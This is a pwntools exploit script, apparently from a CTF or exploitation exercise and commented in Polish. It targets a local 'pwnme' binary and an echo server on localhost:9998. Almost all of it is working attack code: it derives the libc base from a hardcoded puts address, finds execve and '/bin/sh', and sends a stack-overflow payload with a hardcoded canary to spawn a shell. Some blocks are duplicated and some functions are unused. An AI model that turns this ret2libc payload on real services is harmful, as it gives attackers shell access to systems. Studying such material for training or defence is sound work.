from pwn import *
p = process('./pwnme')

puts = 0xb7615d80 #przykladowy. 0xb7e83d80 bez randomizacji
puts = u32(p32(puts))
canary = '\x00\x864B'
#log.info('puts@libc: ' + hex(puts))



libc_elf = ELF(p.libc.path)#ta sama biblioteka co echo-server
puts_offset = libc_elf.symbols['puts']
libc_base = puts - puts_offset
log.info('libc base address: ' + hex(libc_base))

execve_offset = libc_elf.symbols['execve']
log.info('offset of execve: ' + hex(execve_offset))

execve = libc_base + execve_offset
log.info('execve@libc: ' + hex(execve))

binsh_offset = list(libc_elf.search('/bin/sh'))[0]
log.info('offset of binsh: ' + hex(binsh_offset))

binsh = libc_base + binsh_offset
log.info('binsh@libc: ' + hex(binsh))


execve_offset = libc_elf.symbols['execve']
log.info('offset of execve: ' + hex(execve_offset))

execve = libc_base + execve_offset
log.info('execve@libc: ' + hex(execve))


binsh_offset = list(libc_elf.search('/bin/sh'))[0]
log.info('offset of binsh: ' + hex(binsh_offset))

binsh = libc_base + binsh_offset
log.info('binsh@libc: ' + hex(binsh))


payload = p32(execve)
payload += p32(0)
payload += p32(binsh)
payload += p32(0)
payload += p32(0)

inne = 'a'*76 + payload
#con.interactive()
def send(payload, c):
        payload = 'a' * 64 + canary + 12 * 'a' + payload
        c.sendline(payload)

def send2(payload):
        payload = 'a' * 76 + payload
        p.sendline(payload)

con = connect('localhost',9998)
def przejmij():
	#con = connect('localhost',9999)
	con.clean()
	line = 'a' * 64 + canary + 12 * 'a' + payload
	con.sendline(line)
	#send(payload, con)




